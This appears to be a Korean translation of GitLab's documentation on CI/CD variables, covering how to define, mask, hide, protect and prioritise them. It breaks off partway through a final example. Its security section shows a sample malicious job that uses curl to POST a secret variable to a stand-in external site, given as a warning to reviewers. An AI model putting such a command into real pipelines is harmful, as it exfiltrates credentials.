---
stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see <https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments>
title: CI/CD 변수
description: "구성, 사용 및 보안."
---

{{< details >}}

- 티어: Free, Premium, Ultimate
- 제공 서비스: GitLab.com, GitLab Self-Managed, GitLab Dedicated

{{< /details >}}

CI/CD 변수는 환경 변수의 유형입니다. 다음을 위해 사용할 수 있습니다:

- 작업 및 파이프라인의 동작을 제어합니다.
- 재사용하려는 값을 저장합니다(예: [작업 스크립트](job_scripts.md)).
- `.gitlab-ci.yml` 파일에 값을 하드코딩하지 않습니다.

변수 이름은 스크립트를 실행하기 위해 [러너가 사용하는 셸](https://docs.gitlab.com/runner/shells/)에 의해 제한됩니다. 각 셸에는 고유한 예약 변수 이름 집합이 있습니다.

일관된 동작을 보장하려면 항상 변수 값을 작은따옴표 또는 큰따옴표로 묶어야 합니다. 변수는 [Psych YAML 파서](https://docs.ruby-lang.org/en/master/Psych.html)에 의해 내부적으로 구문 분석되므로 따옴표가 있는 변수와 없는 변수가 다르게 구문 분석될 수 있습니다. 예를 들어:

- `VAR1: 012345`은(는) 8진수 값으로 해석되므로 값이 `5349`가 됩니다.
- `VAR1: "012345"`은(는) `012345` 값의 문자열로 구문 분석됩니다.
- `VAR1: 019`은(는) 문자열 `"019"`로 구문 분석되며 8진수가 아닙니다. `9`은(는) 유효한 8진수 숫자가 아니기 때문입니다. 8진수 구문 분석은 모든 숫자가 0–7일 때만 적용됩니다.

GitLab CI/CD 고급 사용에 대한 자세한 내용은 GitLab 엔지니어가 공유하는 [7 advanced GitLab CI workflow hacks](https://about.gitlab.com/webcast/7cicd-hacks/)를 참조하세요.

## 사전 정의된 CI/CD 변수 {#predefined-cicd-variables}

GitLab CI/CD는 [사전 정의된 CI/CD 변수](predefined_variables.md) 세트를 파이프라인 구성 및 작업 스크립트에서 사용할 수 있도록 제공합니다. 이러한 변수에는 작업, 파이프라인 및 파이프라인이 트리거되거나 실행될 때 필요할 수 있는 기타 값에 대한 정보가 포함되어 있습니다.

먼저 선언하지 않고도 `.gitlab-ci.yml`에서 사전 정의된 CI/CD 변수를 사용할 수 있습니다. 예를 들어:

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

이 예제의 스크립트는 `The job's stage is 'test'`을(를) 출력합니다.

## `.gitlab-ci.yml` 파일에서 CI/CD 변수 정의 {#define-a-cicd-variable-in-the-gitlab-ciyml-file}

`.gitlab-ci.yml` 파일에서 CI/CD 변수를 만들려면 [`variables`](../yaml/_index.md#variables) 키워드로 변수와 값을 정의합니다.

`.gitlab-ci.yml` 파일에 저장된 변수는 리포지토리에 액세스할 수 있는 모든 사용자에게 표시되며 민감하지 않은 구성만 저장해야 합니다. 예를 들어 `DATABASE_URL` 변수에 저장된 데이터베이스의 URL입니다. 시크릿 또는 키와 같은 값이 포함된 민감한 변수는 UI의 설정에 추가해야 합니다.

`variables`을(를) 다음에서 정의할 수 있습니다:

- 작업: 변수는 해당 작업의 `script`, `before_script` 또는 `after_script` 섹션과 일부 [작업 키워드](../yaml/_index.md#job-keywords)에서만 사용할 수 있습니다.
- `.gitlab-ci.yml` 파일의 최상위 수준: 변수는 작업이 동일한 이름의 변수를 정의하지 않는 한, 파이프라인의 모든 작업에 대한 기본값으로 사용할 수 있습니다.. 작업의 변수가 우선합니다.

두 경우 모두 [키워드](../yaml/_index.md#global-keywords)와 함께 이러한 변수를 사용할 수 없습니다.

예를 들어:

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

이 예에서:

- `job1`은(는) `Variables are 'A default variable' and 'Job 1 variable'`을(를) 출력합니다.
- `job2`은(는) `Variables are 'Different value than default', 'Job 2 variable', and ''`을(를) 출력합니다.

`value` 및 `description` 키워드를 사용하여 수동으로 트리거된 파이프라인을 위해 [미리 채워진 변수](../pipelines/_index.md#prefill-variables-in-manual-pipelines)를 정의합니다.

### 단일 작업에서 기본 변수 건너뛰기 {#skip-default-variables-in-a-single-job}

기본 변수를 작업에서 사용할 수 없도록 하려면 `variables`을(를) `{}`로 설정합니다:

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## UI에서 CI/CD 변수 정의 {#define-a-cicd-variable-in-the-ui}

토큰이나 암호와 같은 민감한 변수는 `.gitlab-ci.yml` 파일이 아닌 UI의 설정에 저장해야 합니다.

기본적으로 포크된 프로젝트의 파이프라인은 부모 프로젝트에서 사용할 수 있는 CI/CD 변수에 액세스할 수 없습니다. [포크에서 머지 리퀘스트에 대한 부모 프로젝트에서 머지 리퀘스트 파이프라인을 실행](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)하면 모든 변수를 에 사용할 수 있습니다.

### 프로젝트의 경우 {#for-a-project}

{{< history >}}

- 기본 공개범위가 [변경](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494)되었습니다. **표시**에서 **마스킹됨**으로 GitLab 18.3에서 변경되었습니다.

{{< /history >}}

의 설정에 CI/CD 변수를 추가할 수 있습니다. 는 최대 8000개의 CI/CD 변수를 가질 수 있습니다.

전제 조건:

- 멤버이면서 유지 관리자 역할을 가져야 합니다.

설정에서 변수를 추가하거나 업데이트하려면:

1. 상단 표시줄에서 **검색 또는 이동**을 선택하고 프로젝트를 찾습니다.
1. 왼쪽 사이드바에서 **설정** > **CI/CD**를 선택합니다.
1. **변수**를 펼칩니다.
1. **변수 추가**를 선택하고 세부 정보를 입력합니다:
   - **키**: 한 줄이어야 하며 공백이 없어야 하며 문자, 숫자 또는 `_`만 사용해야 합니다.
   - **Value (값)**: 값은 10,000자로 제한되지만 러너의 운영 체제에서 제한하는 모든 제한에 의해서도 제한됩니다. 값에는 **공개범위**가 **마스킹됨** 또는 **마스킹 및 숨김**으로 설정된 경우 추가 제한이 있습니다.
   - **유형**: `Variable` (기본값) 또는 [`File`](#use-file-type-cicd-variables).
   - **환경 범위**: 선택 사항. **모두 (기본값)** (`*`), 특정 [환경](../environments/_index.md) 또는 와일드카드 환경 범위.
   - **보호 변수** 선택 사항. 선택하면 변수는 보호된 브랜치 또는 보호된 태그에서 실행되는 파이프라인에서만 사용할 수 있습니다.
   - **공개범위**: **표시**, **마스킹됨** (기본값) 또는 **마스킹 및 숨김**을 선택합니다.
   - **변수 참조 펼침**: 선택 사항. 선택하면 변수는 다른 변수를 참조할 수 있습니다. **공개범위**가 **마스킹됨** 또는 **마스킹 및 숨김**으로 설정된 경우 다른 변수를 참조할 수 없습니다.

또는 [API를 사용하여](../../api/project_level_variables.md) 변수를 추가할 수 있습니다.

### 그룹의 경우 {#for-a-group}

{{< history >}}

- 기본 공개범위가 [변경](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494)되었습니다. **표시**에서 **마스킹됨**으로 GitLab 18.3에서 변경되었습니다.

{{< /history >}}

그룹의 모든 에서 CI/CD 변수를 사용할 수 있도록 할 수 있습니다. 그룹은 최대 30000개의 CI/CD 변수를 가질 수 있습니다.

전제 조건:

- 그룹 멤버이면서 소유자 역할을 가져야 합니다.

그룹 변수를 추가하려면:

1. 상단 표시줄에서 **검색 또는 이동**을 선택하고 그룹을 찾습니다.
1. 왼쪽 사이드바에서 **설정** > **CI/CD**를 선택합니다.
1. **변수**를 펼칩니다.
1. **변수 추가**를 선택하고 세부 정보를 입력합니다:
   - **키**: 한 줄이어야 하며 공백이 없어야 하며 문자, 숫자 또는 `_`만 사용해야 합니다.
   - **Value (값)**: 값은 10,000자로 제한되지만 러너의 운영 체제에서 제한하는 모든 제한에 의해서도 제한됩니다. 값에는 **공개범위**가 **마스킹됨** 또는 **마스킹 및 숨김**으로 설정된 경우 추가 제한이 있습니다.
   - **유형**: `Variable` (기본값) 또는 [`File`](#use-file-type-cicd-variables).
   - **보호 변수** 선택 사항. 선택하면 변수는 보호된 브랜치 또는 보호된 태그에서 실행되는 파이프라인에서만 사용할 수 있습니다.
   - **공개범위**: **표시**, **마스킹됨** (기본값), **마스킹 및 숨김**을 선택합니다.
   - **변수 참조 펼침**: 선택 사항. 선택하면 변수는 다른 변수를 참조할 수 있습니다. **공개범위**가 **마스킹됨** 또는 **마스킹 및 숨김**으로 설정된 경우 다른 변수를 참조할 수 없습니다.

에서 사용할 수 있는 그룹 변수는 의 **설정** > **CI/CD** > **변수** 섹션에 나열됩니다. 하위 그룹의 변수는 재귀적으로 상속됩니다.

또는 [API를 사용하여](../../api/group_level_variables.md) 그룹 변수를 추가할 수 있습니다.

#### 환경 범위 {#environment-scope}

{{< details >}}

- 티어: Premium, Ultimate

{{< /details >}}

그룹 CI/CD 변수를 특정 환경에서만 사용할 수 있도록 설정하려면:

1. 상단 표시줄에서 **검색 또는 이동**을 선택하고 그룹을 찾습니다.
1. 왼쪽 사이드바에서 **설정** > **CI/CD**를 선택합니다.
1. **변수**를 펼칩니다.
1. 변수 오른쪽에서 **편집** ({{< icon name="pencil" >}})을 선택합니다.
1. **환경 범위**의 경우 **모두 (기본값)** (`*`), 특정 [환경](../environments/_index.md) 또는 와일드카드 환경 범위를 선택합니다.

### 인스턴스 {#for-an-instance}

{{< details >}}

- 티어: Free, Premium, Ultimate
- 제공 서비스: GitLab Self-Managed, GitLab Dedicated

{{< /details >}}

{{< history >}}

- 기본 공개범위가 [변경](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494)되었습니다. **표시**에서 **마스킹됨**으로 GitLab 18.3에서 변경되었습니다.
- **마스킹 및 숨김** 옵션이 [GitLab 19.0에서 도입](https://gitlab.com/gitlab-org/gitlab/-/issues/592708)되었습니다.

{{< /history >}}

GitLab 인스턴스의 모든 및 그룹에서 CI/CD 변수를 사용할 수 있도록 할 수 있습니다.

전제 조건:

- 인스턴스에 대한 관리자 액세스 권한이 있어야 합니다.

인스턴스 변수를 추가하려면:

1. 오른쪽 위 모서리에서 **Admin**을 선택합니다.
1. 왼쪽 사이드바에서 **설정** > **CI/CD**를 선택합니다.
1. **변수**를 펼칩니다.
1. **변수 추가**를 선택하고 세부 정보를 입력합니다:
   - **키**: 한 줄이어야 하며 공백이 없어야 하며 문자, 숫자 또는 `_`만 사용해야 합니다.
   - **Value (값)**: 값은 10,000자로 제한되지만 러너의 운영 체제에서 제한하는 모든 제한에 의해서도 제한됩니다. **공개범위**가 **표시**로 설정된 경우 다른 제한은 없습니다.
   - **유형**: `Variable` (기본값) 또는 `File`.
   - **보호 변수** 선택 사항. 선택하면 변수는 보호된 브랜치 또는 태그에서 실행되는 파이프라인에서만 사용할 수 있습니다.
   - **공개범위**: **표시**, **마스킹됨** (기본값) 또는 **마스킹 및 숨김**을 선택합니다.
   - **변수 참조 펼침**: 선택 사항. 선택하면 변수는 다른 변수를 참조할 수 있습니다. **공개범위**가 **마스킹됨** 또는 **마스킹 및 숨김**으로 설정된 경우 다른 변수를 참조할 수 없습니다.

또는 [API를 사용하여](../../api/instance_level_ci_variables.md) 인스턴스 변수를 추가할 수 있습니다.

## CI/CD 변수 보안 {#cicd-variable-security}

`.gitlab-ci.yml` 파일로 푸시된 코드는 변수를 손상시킬 수 있습니다. 변수는 작업 로그에 실수로 노출되거나 악의적으로 타사 서버로 전송될 수 있습니다.

`.gitlab-ci.yml` 파일에 변경 사항을 도입하는 모든 머지 리퀘스트를 검토한 후:

- [포크된 프로젝트에서 제출된 머지 리퀘스트에 대해 부모 프로젝트에서 파이프라인을 실행](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)합니다.
- 변경 사항을 병합합니다.

가져온 의 `.gitlab-ci.yml` 파일을 검토한 후 파일을 추가하거나 파이프라인을 실행합니다.

다음 예제는 `.gitlab-ci.yml` 파일의 악성 코드를 보여줍니다:

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

`accidental-leak-job`과(와) 같은 스크립트를 통한 누출 위험을 줄이기 위해 민감한 정보를 포함하는 모든 변수를 항상 작업 로그에 마스킹해야 합니다. 또한 [변수를 보호된 브랜치 및 태그만으로 제한](#protect-a-cicd-variable)할 수 있습니다.

또는 [외부 시크릿 관리 제공자와 연결](../secrets/_index.md)하여 시크릿을 저장하고 검색합니다.

`malicious-job`과(와) 같은 악성 스크립트는 검토 프로세스 중에 발견되어야 합니다. 검토자는 악성 코드가 마스킹된 변수와 보호된 변수 모두를 손상시킬 수 있으므로 이러한 코드를 발견할 때 파이프라인을 트리거해서는 안 됩니다.

변수 값은 [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)을(를) 사용하여 암호화되고 데이터베이스에 저장됩니다. 이 데이터는 유효한 [파일](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost)로 읽고 해독할 수 있습니다.

### CI/CD 변수 마스킹 {#mask-a-cicd-variable}

> [!warning]
> CI/CD 변수를 마스킹하는 것은 악의적인 사용자가 변수 값에 액세스하는 것을 방지하는 보장된 방법이 아닙니다. 민감한 정보의 보안을 보장하려면 [외부](../secrets/_index.md) 및 [유형 변수](#use-file-type-cicd-variables)를 사용하여 `env` 또는 `printenv` 명령이 변수를 인쇄하는 것을 방지합니다.

프로젝트, 그룹 또는 인스턴스에 대해 CI/CD 변수를 마스킹하여 값이 작업 로그에 표시되지 않도록 할 수 있습니다. 작업이 마스킹된 변수의 값을 출력할 때 값은 작업 로그에서 `[MASKED]`로 바뀝니다. 경우에 따라 `[MASKED]` 값 뒤에 `x` 문자가 나올 수도 있습니다.

전제 조건:

- [UI에서 CI/CD 변수를 추가](#define-a-cicd-variable-in-the-ui)하는 데 필요한 것과 동일한 역할 또는 액세스 수준을 가져야 합니다.

변수를 마스킹하려면:

1. 그룹, 또는 **운영자** 영역에서 **설정** > **CI/CD**를 선택합니다.
1. **변수**를 펼칩니다.
1. 보호하려는 변수 옆에서 **편집**을 선택합니다.
1. **공개범위** 아래에서 **Mask variable**을 선택합니다.
1. 권장됨. [**변수 참조 펼침**](#allow-cicd-variable-expansion) 확인란을 취소합니다. 변수 확장이 활성화된 경우 변수 값에서 사용할 수 있는 유일한 영숫자가 아닌 문자는: `_`, `:`, `@`, `-`, `+`, `.`, `~`, `=`, `/` 및 `~`입니다. 설정이 비활성화되면 모든 문자를 사용할 수 있습니다.
1. **변수 업데이트**를 선택합니다.

변수의 값은 다음을 만족해야 합니다:

- 공백이 없는 한 줄이어야 합니다.
- 8자 이상이어야 합니다.
- 기존 사전 정의된 또는 사용자 정의 CI/CD 변수의 이름과 일치해서는 안 됩니다.

프로세스가 값을 약간 수정된 방식으로 출력하면 값을 마스킹할 수 없습니다. 예를 들어 셸이 특수 문자를 이스케이프하기 위해 ` \ `을(를) 추가하면 값이 마스킹되지 않습니다:

- 예제 마스킹된 변수 값: `My[value]`
- 이 출력은 마스킹되지 않습니다: `My\[value\]`

`CI_DEBUG_SERVICES`이(가) 활성화되면 변수 값이 노출될 수 있습니다. 자세한 내용은 [컨테이너 로깅](../services/_index.md#capturing-service-container-logs)을(를) 참조하세요.

### CI/CD 변수 숨기기 {#hide-a-cicd-variable}

{{< history >}}

- GitLab 17.4에서 [도입](https://gitlab.com/gitlab-org/gitlab/-/issues/29674)되었습니다. [로](../../administration/feature_flags/_index.md) `ci_hidden_variables`라는 이름입니다. 기본적으로 활성화됩니다.
- GitLab 17.6에서 [일반적으로 제공됨](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843). 기능 플래그 `ci_hidden_variables`이 제거되었습니다.

{{< /history >}}

마스킹 외에도 **CI/CD** 설정 페이지에서 CI/CD 변수의 값이 노출되는 것을 방지할 수 있습니다. 변수 숨기기는 새 변수를 만들 때만 가능하며 기존 변수를 숨기도록 업데이트할 수 없습니다.

전제 조건:

- [UI에서 CI/CD 변수를 추가](#define-a-cicd-variable-in-the-ui)하는 데 필요한 것과 동일한 역할 또는 액세스 수준을 가져야 합니다.
- 변수 값이 [마스킹된 변수의 요구 사항](#mask-a-cicd-variable)과(와) 일치해야 합니다.

변수를 숨기려면 **마스킹 및 숨김**을 **공개범위** 섹션에서 선택합니다. [UI에서 새 CI/CD 변수를 추가](#define-a-cicd-variable-in-the-ui)할 때입니다. 변수를 저장한 후 변수를 CI/CD 파이프라인에서 사용할 수 있지만 UI에서 다시 노출할 수 없습니다.

### CI/CD 변수 보호 {#protect-a-cicd-variable}

프로젝트, 그룹 또는 인스턴스 CI/CD 변수를 [보호된 브랜치](../../user/project/repository/branches/protected.md) 또는 [보호된 태그](../../user/project/protected_tags.md)에서 실행되는 파이프라인에만 사용할 수 있도록 구성할 수 있습니다.

병합 결과 파이프라인 및 머지 리퀘스트 파이프라인은 [보호된 변수에 선택적으로 액세스](../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners)할 수 있습니다.

전제 조건:

- [UI에서 CI/CD 변수를 추가](#define-a-cicd-variable-in-the-ui)하는 데 필요한 것과 동일한 역할 또는 액세스 수준을 가져야 합니다.

변수를 보호된 것으로 설정하려면:

1. 또는 그룹의 경우 **설정** > **CI/CD**로 이동합니다.
1. **변수**를 펼칩니다.
1. 보호하려는 변수 옆에서 **편집**을 선택합니다.
1. **보호 변수** 확인란을 선택합니다.
1. **변수 업데이트**를 선택합니다.

변수는 이후의 모든 파이프라인에서 사용할 수 있습니다.

### 유형 CI/CD 변수 사용 {#use-file-type-cicd-variables}

모든 사전 정의된 CI/CD 변수 및 `.gitlab-ci.yml` 파일에서 정의된 변수는 "variable" 유형입니다([`"variable_type": "env_var"` API에서](../../api/project_level_variables.md)).

변수 유형 변수:

- 키와 값 쌍으로 구성됩니다.
- 환경 변수로 작업에서 사용 가능합니다:
  - CI/CD 변수 키를 환경 변수 이름으로.
  - CI/CD 변수 값을 환경 변수 값으로.

, 그룹 및 인스턴스 CI/CD 변수는 기본적으로 "variable" 유형이지만 선택적으로 "file" 유형으로 설정할 수 있습니다(`"variable_type": "file"` API에서). 유형 변수:

- 키, 값 및 파일로 구성됩니다.
- 환경 변수로 작업에서 사용 가능합니다:
  - CI/CD 변수 키를 환경 변수 이름으로.
  - CI/CD 변수 값이 임시 파일에 저장됩니다.
  - 임시 파일의 경로를 환경 변수 값으로 사용합니다.

을 입력으로 필요로 하는 도구에 유형 CI/CD 변수를 사용합니다.

예를 들어 AWS CLI와 `kubectl`은(는) 모두 구성을 위해 `File` 유형 변수를 사용하는 도구입니다. `kubectl`을(를) 다음과 함께 사용하는 경우:

- `KUBE_URL`의 키를 가진 변수 및 `https://example.com`을(를) 값으로.
- `KUBE_CA_PEM`의 키를 가진 유형 변수 및 인증서를 값으로.

`KUBE_URL`을(를) `--server` 옵션으로 전달합니다. 변수를 허용하며, `$KUBE_CA_PEM`을(를) `--certificate-authority` 옵션으로 전달합니다. 의 경로를 허용합니다:

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

#### `.gitlab-ci.yml` 변수를 유형 변수로 사용 {#use-a-gitlab-ciyml-variable-as-a-file-type-variable}

[`.gitlab-ci.yml` 파일에서 정의](#define-a-cicd-variable-in-the-gitlab-ciyml-file)된 CI/CD 변수를 유형 변수로 설정할 수 없습니다. 경로를 입력으로 필요로 하는 도구가 있지만 `.gitlab-ci.yml`에서 정의된 변수를 사용하려는 경우:

- 변수의 값을 에 저장하는 명령을 실행합니다.
- 해당 을 도구와 함께 사용합니다.

예를 들어:

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## CI/CD 변수 확장 허용 {#allow-cicd-variable-expansion}

{{< history >}}

- **Expand variable** 옵션이 GitLab 18.6에서 [기본적으로 비활성화](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/209144)됩니다.

{{< /history >}}

변수를 `$` 문자를 포함하는 값을 다른 변수에 대한 참조로 처리하도록 설정할 수 있습니다. 파이프라인이 실행될 때 참조는 참조된 변수의 값을 사용하도록 확장됩니다.

UI에서 정의된 CI/CD 변수는 기본적으로 확장되지 않습니다. `.gitlab-ci.yml` 파일에서 정의된 CI/CD 변수의 경우 [`variables:expand` 키워드](../yaml/_index.md#variablesexpand)로 변수 확장을 제어합니다.

전제 조건:

- [UI에서 CI/CD 변수를 추가](#define-a-cicd-variable-in-the-ui)하는 데 필요한 것과 동일한 역할 또는 액세스 수준을 가져야 합니다.

변수에 대한 변수 확장을 활성화하려면:

1. 또는 그룹의 경우 **설정** > **CI/CD**로 이동합니다.
1. **변수**를 펼칩니다.
1. 확장하지 않으려는 변수 옆에서 **편집**을 선택합니다.
1. **변수 참조 펼침** 확인란을 선택합니다.
1. **변수 업데이트**를 선택합니다.

> [!note]
> 변수 확장을 사용하려면 변수 값을 [마스킹](#mask-a-cicd-variable)하지 마세요. 마스킹과 변수 확장을 모두 결합하면 문자 제한으로 인해 다른 변수를 참조하기 위해 `$`를 사용할 수 없습니다.

## CI/CD 변수 우선 순위 {#cicd-variable-precedence}

다양한 위치에서 같은 이름의 CI/CD 변수를 사용할 수 있지만 값이 서로 덮어쓸 수 있습니다. 변수의 유형과 정의된 위치에 따라 어떤 변수가 우선순위를 갖는지 결정됩니다.

변수의 우선 순위 순서는 (높음에서 낮음):

1. [파이프라인 실행 정책 변수](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables).
1. [검사 실행 정책 변수](../../user/application_security/policies/scan_execution_policies.md).
1. [파이프라인 변수](#use-pipeline-variables). 이러한 변수는 모두 동일한 우선 순위를 갖습니다:
   - 다운스트림 파이프라인에 전달된 변수.
   - 트리거 변수.
   - 예약된 파이프라인 변수.
   - 수동 파이프라인 변수.
   - API로 파이프라인을 만들 때 추가된 변수.
   - 수동 작업 변수.
1. 변수.
1. 그룹 변수. 그룹과 하위 그룹에 같은 변수 이름이 있는 경우 작업은 가장 가까운 하위 그룹의 값을 사용합니다. 예를 들어 `Group > Subgroup 1 > Subgroup 2 > Project`이(가) 있는 경우 `Subgroup 2`에서 정의된 변수가 우선합니다.
1. 인스턴스 변수.
1. [`dotenv` 보고서의 변수](dotenv_variables.md#pass-variables-to-later-jobs).
1. `.gitlab-ci.yml` 파일의 작업에서 정의된 작업 변수.
1. `.gitlab-ci.yml` 파일의 최상위 수준에서 정의된 모든 작업의 기본 변수.
1. [배포 변수](predefined_variables.md#deployment-variables).
1. [사전 정의된 변수](predefined_variables.md).

예를 들어:

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

이 예제에서 `job1`은(는) `The variable is 'secure'`을(를) 출력합니다. `.gitlab-ci.yml` 파일의 작업에서 정의된 변수가 기본 변수보다 우선 순위가 높기 때문입니다.

## 파이프라인 변수 사용 {#use-pipeline-variables}

파이프라인 변수는 새 파이프라인을 실행할 때 지정되는 변수입니다.

> [!note]
> [GitLab 17.7](../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables) 이상에서는 [파이프라인 입력](../inputs/_index.md#for-a-pipeline)이 파이프라인 변수 전달보다 권장됩니다. 보안 강화를 위해 입력을 사용할 때 [파이프라인 변수를 비활성화](#restrict-pipeline-variables)해야 합니다.

전제 조건:

- 에서 개발자 역할을 가져야 합니다.

다음 중 하나를 수행할 때 파이프라인 변수를 지정할 수 있습니다:

- UI에서 [파이프라인을 수동으로 실행](../jobs/job_control.md#specify-variables-when-running-manual-jobs)합니다.
- [예약된 파이프라인](../pipelines/schedules.md#create-a-pipeline-schedule)을(를) 만듭니다.
- [`pipelines` API 엔드포인트를 사용](../../api/pipelines.md#create-a-new-pipeline)하여 파이프라인을 만듭니다.
- [`triggers` API 엔드포인트를 사용](../triggers/_index.md#pass-cicd-variables-in-the-api-call)하여 파이프라인을 만듭니다.
- [푸시 옵션](../../topics/git/commit.md#push-options-for-gitlab-cicd)을 사용합니다.
- [`variables` 키워드](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline), [`trigger:forward` 키워드](../yaml/_index.md#triggerforward) 또는 [`dotenv` 변수](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job)를 사용하여 다운스트림 파이프라인에 변수를 전달합니다.

이러한 변수는 우선 순위가 높으며 사전 정의된 변수를 포함하여 다른 정의된 변수를 무시할 수 있습니다.

> [!warning]
> 파이프라인 동작이 예기치 않게 될 수 있으므로 대부분의 경우 사전 정의된 변수를 무시하는 것을 피해야 합니다.

### 파이프라인 변수 제한 {#restrict-pipeline-variables}

{{< history >}}

- GitLab 17.1에서 [도입](https://gitlab.com/gitlab-org/gitlab/-/issues/440338)되었습니다.
- GitLab.com의 경우 설정 기본값이 [모든 새 네임스페이스의 새 에 대해 업데이트](https://gitlab.com/gitlab-org/gitlab/-/issues/502382)되었습니다. GitLab 17.7에서 `ci_pipeline_variables_minimum_override_role`의 경우 `no_one_allowed`으로.

{{< /history >}}

파이프라인 변수로 파이프라인을 실행할 수 있는 사용자를 특정 사용자 역할로 제한할 수 있습니다. 낮은 역할을 가진 사용자가 파이프라인 변수를 사용하려고 하면 `Insufficient permissions to set pipeline variables` 오류 메시지가 표시됩니다.

전제 조건:

- 에서 유지 관리자 역할을 가져야 합니다. 최소 역할이 이전에 `owner` 또는 `no_one_allowed`로 설정된 경우 에서 소유자 역할을 가져야 합니다.

파이프라인 변수의 사용을 유지 관리자 역할 이상으로만 제한하려면:

- **설정** > **CI/CD** > **변수**로 이동합니다.
- **파이프라인 변수를 사용할 수 있는 최저 역할** 아래에서 다음 중 하나를 선택합니다:
  - `no_one_allowed`: 파이프라인 변수로 파이프라인을 실행할 수 없습니다. GitLab.com의 새 네임스페이스에서 새 에 대한 기본값입니다. 설정이 이 값이 되면 소유자 역할만 변경할 수 있습니다.
  - `owner`: 소유자 역할을 가진 사용자만 파이프라인 변수로 파이프라인을 실행할 수 있습니다. 설정이 이 값이 되면 소유자 역할만 변경할 수 있습니다.
  - `maintainer`: 유지 관리자 또는 소유자 역할을 가진 사용자만 파이프라인 변수로 파이프라인을 실행할 수 있습니다. GitLab Self-Managed 및 GitLab Dedicated에서 지정되지 않은 경우의 기본값입니다.
  - `developer`: 개발자, 유지 관리자 또는 소유자 역할을 가진 사용자만 파이프라인 변수로 파이프라인을 실행할 수 있습니다.

[API](../../api/projects.md#update-a-project)를 사용하여 `ci_pipeline_variables_minimum_override_role` 설정의 역할을 설정할 수도 있습니다.

이 제한은 또는 그룹 설정의 CI/CD 변수 사용에 영향을 주지 않습니다. 대부분의 작업은 여전히 YAML 구성에서 `variables` 키워드를 사용할 수 있지만 `trigger` 키워드를 사용하여 다운스트림 파이프라인을 트리거하는 작업은 사용할 수 없습니다. 트리거 작업은 변수를 다운스트림 파이프라인에 파이프라인 변수로 전달합니다. 이것도 이 설정에 의해 제어됩니다.

#### 여러 프로젝트에 대한 파이프라인 변수 제한 활성화 {#enable-pipeline-variable-restriction-for-multiple-projects}

{{< history >}}

- GitLab 18.4에 [도입됨](https://gitlab.com/gitlab-org/gitlab/-/issues/514242).

{{< /history >}}

많은 프로젝트가 있는 그룹의 경우 현재 사용하지 않는 모든 프로젝트에서 파이프라인 변수를 비활성화할 수 있습니다. 이 옵션은 **파이프라인 변수를 사용할 수 있는 최저 역할** 설정을 변수를 사용하지 않은 에 대해 `no_one_allowed`로 설정합니다.

전제 조건:

- 그룹의 Owner 역할이 있어야 합니다.

그룹의 프로젝트에서 파이프라인 변수 제한 설정을 활성화하려면:

1. 상단 표시줄에서 **검색 또는 이동**을 선택하고 그룹을 찾습니다.
1. 왼쪽 사이드바에서 **설정** > **CI/CD**를 선택합니다.
1. **변수**를 펼칩니다.
1. **파이프라인 변수를 사용하지 않는 프로젝트에서 비활성화** 섹션에서 **마이그레이션 시작**을 선택합니다.

마이그레이션은 백그라운드에서 실행됩니다. 마이그레이션이 완료되면 이메일 알림을 받습니다. 유지 관리자는 나중에 필요한 경우 개별 에 대한 설정을 변경할 수 있습니다.

## 변수 내보내기 {#exporting-variables}

별도의 셸 컨텍스트에서 실행되는 스크립트는 내보내기, 별칭, 로컬 함수 정의 또는 기타 로컬 셸 업데이트를 공유하지 않습니다.

이는 작업이 실패하면 사용자 정의 스크립트로 만든 변수가 내보내지지 않음을 의미합니다.

러너가 `.gitlab-ci.yml`에서 정의된 작업을 실행할 때:

- `before_script`에서 지정된 스크립트와 메인 스크립트는 단일 셸 컨텍스트에서 함께 실행되며 연결됩니다.
- `after_script`에서 지정된 스크립트는 `before_script` 및 지정된 스크립트와 완전히 별개의 셸 컨텍스트에서 실행됩니다.

스크립트가 실행되는 셸에 관계없이 러너 출력에는 다음이 포함됩니다:

- 사전 정의된 변수.
- 다음에서 정의된 변수:
  - 인스턴스, 그룹 또는 CI/CD 설정.
  - `.gitlab-ci.yml` 파일의 `variables:` 섹션.
  - `.gitlab-ci.yml` 파일의 `secrets:` 섹션.
  - `config.toml`.

러너는 `export MY_VARIABLE=1`과(와) 같은 스크립트 본문에서 실행되는 수동 내보내기, 셸 별칭 및 함수를 처리할 수 없습니다.

예를 들어 다음 `.gitlab-ci.yml` 파일에서 다음 스크립트가 정의됩니다:

```yaml
job:
 variables:
